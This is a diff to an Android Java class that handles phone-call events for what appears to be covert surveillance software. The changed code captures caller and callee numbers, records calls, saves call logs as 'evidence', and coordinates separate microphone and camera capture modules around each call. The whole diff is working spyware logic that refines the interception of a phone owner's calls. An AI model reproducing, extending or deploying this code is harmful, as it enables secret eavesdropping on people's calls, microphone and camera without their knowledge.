@@ -74,14 +74,19 @@ public class BroadcastMonitorCall  {
 
 	public static void manageReceive(Context context, Intent intent) {
 		try {
-
+			boolean exit=false;
 			TelephonyManager telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
 			Integer callState = Integer.valueOf(telManager.getCallState());
+
 			/****************************************/
 			/** INCOMING:  RINGING->OFFHOOK->IDLE
 			 /** OUTCOMING: OFFHOOK->IDLE
 			 /****************************************/
 			String extraIntent = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (manageReceive): callState="+callState.intValue());
+				Check.log(TAG + " (manageReceive): intent="+intent);
+			}
 			if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
 				ongoing_number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
 				// Outgoing phone call
@@ -89,7 +94,7 @@ public class BroadcastMonitorCall  {
 					Check.log(TAG + " (manageReceive): OUTGOING, my===> " + ongoing_number);//$NON-NLS-1$
 				}
 				incoming = Call.OUTGOING;
-				return;
+				exit = true;
 			}else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
 				// il numero delle chiamate entranti lo abbiamo solo qui
 				ongoing_number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
@@ -99,8 +104,23 @@ public class BroadcastMonitorCall  {
 					Check.log(TAG + " (manageReceive): RINGING, my<===" + ongoing_number);//$NON-NLS-1$
 				}
 				incoming = Call.INCOMING;
+				addStopsForCall();
+				exit = true;
+			}
+			if(exit) {
+				// stop mic and Camera as soon as possible
+				/* todo: in case of the phone has not a sim or the gsm network isn't avaialble
+				 * it happens that mic and camera get stopped but not restarted because there isn't any
+				 * call start and stop
+				 */
+				if (ongoing_number != "") {
+					// improvements: we can check if a trial to call a number has been done without success
+					// and log it as CallListInfo
+					call = new Call(ongoing_number, incoming);
+				}
 				return;
 			}
+
 			switch (callState.intValue()) {
 				case TelephonyManager.CALL_STATE_IDLE:
 					if (Cfg.DEBUG) {
@@ -108,8 +128,15 @@ public class BroadcastMonitorCall  {
 					}
 					//stop it
 					if (call != null) {
+						if(!call.isIncoming() && !call.isOngoing()){
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (manageReceive):  outgoing call never started ... don't stop it");
+								return ;
+							}
+						}
+						call.setComplete(call.isOngoing() ? true : false);
 						call.setOngoing(false);
-						call.setComplete(incoming ? true : false);
+
 						//ListenerCall.self().dispatch(call);
 						// Let's start with call recording
 						if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag() ) {
@@ -125,19 +152,31 @@ public class BroadcastMonitorCall  {
 								String from = call.getFrom();
 								String to = call.getTo();
 
-								ModuleCall.self().saveCalllistEvidence(ModuleCall.CALLIST_PHONE, from, to, incoming, call.getTimeBegin(), call.getDuration());
+								ModuleCall.self().saveCalllistEvidence(ModuleCall.CALLIST_PHONE, from, to, incoming, call.getTimeBegin(), call.isOffhook()?call.getDuration():0);
 							}else {
-								RecordCall.self().stopCall();
-								if (ModuleCamera.self() != null) {
-									ModuleCamera.self().removeStop(MODULE_STOP_REASON);
-								}
-								if (ModuleMic.self() != null) {
-									ModuleMic.self().removeStop(MODULE_STOP_REASON);
-								}
+								stopRecordCall();
 							}
 							ongoing_number="";
 						}
 					}
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (manageReceive): Removing stops from Mic and Camera");
+					}
+					if (ModuleCamera.self() != null) {
+						ModuleCamera.self().removeStop(MODULE_STOP_REASON);
+					}
+					if( android.os.Build.VERSION.SDK_INT > 20 ) {// L+
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(manageReceive): Android 5.0 mic hasn't started" );
+						}
+
+					}else {
+						if (ModuleMic.self() != null) {
+							ModuleMic.self().removeStop(MODULE_STOP_REASON);
+						}
+					}
+
+				break;
 
 				case TelephonyManager.CALL_STATE_OFFHOOK:
 					if (Cfg.DEBUG) {
@@ -149,23 +188,39 @@ public class BroadcastMonitorCall  {
 							Check.log(TAG + " (manageReceive): Call START aborted invalid number");
 						}
 					}else {
-						call = new Call(ongoing_number, incoming);
-						if (call != null) {
+
+						if (call != null ) {
+							if(call.isOngoing()){
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (manageReceive): call already started ... don't start it again");
+									return ;
+								}
+							}
+							if(incoming==Call.OUTGOING) {
+								addStopsForCall();
+							}
 							call.setOngoing(true);
 							call.setOffhook();
 							//ListenerCall.self().dispatch(call);
 							if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag()) {
 								if (Cfg.DEBUG) {
-									Check.log(TAG + " (c): starting call"); //$NON-NLS-1$
+									Check.log(TAG + " (manageReceive): starting call"); //$NON-NLS-1$
 								}
-								if(ModuleMic.self()!=null) {
-									ModuleMic.self().addStop(MODULE_STOP_REASON);
+								try {
+									startRecordCall();
+								}catch(Exception ex){
+									if (Cfg.EXCEPTION) {
+										Check.log(TAG + " (manageReceive) Error: starting call " + ex);
+										ex.printStackTrace();
+									}
 								}
-								if(ModuleCamera.self()!=null) {
-									ModuleCamera.self().addStop(MODULE_STOP_REASON);
+							}else{
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (manageReceive): NOT starting call ModuleCall.self()= " + ModuleCall.self()); //$NON-NLS-1$
+									if (ModuleCall.self() != null ){
+										Check.log(TAG + " (manageReceive): ModuleCall.self().isRecordFlag()= " + ModuleCall.self().isRecordFlag()); //$NON-NLS-1$
+									}
 								}
-								RecordCall.self().recordCall(call);
-
 							}
 						}
 					}
@@ -190,6 +245,36 @@ public class BroadcastMonitorCall  {
 				ex.printStackTrace();
 			}
 		}
+	}
+
+	public static void addStopsForCall() {
+		if(ongoing_number!="") {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (manageReceive): Adding stops for Mic and Camera");
+			}
+			if (android.os.Build.VERSION.SDK_INT > 20) {// L+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(manageReceive): Android 5.0 don't stop the mic");
+				}
+			} else {
+				if (ModuleMic.self() != null) {
+					ModuleMic.self().addStop(MODULE_STOP_REASON);
+				}
+			}
+			if (ModuleCamera.self() != null) {
+				ModuleCamera.self().addStop(MODULE_STOP_REASON);
+			}
+		}
+	}
+
+	public static void startRecordCall() {
+		if(call.isOngoing()) {
+			RecordCall.self().recordCall(call);
+		}
+	}
+
+	public static void stopRecordCall() {
+		RecordCall.self().stopCall();
 	}
 
 	public static void stopOnGoingRec() {
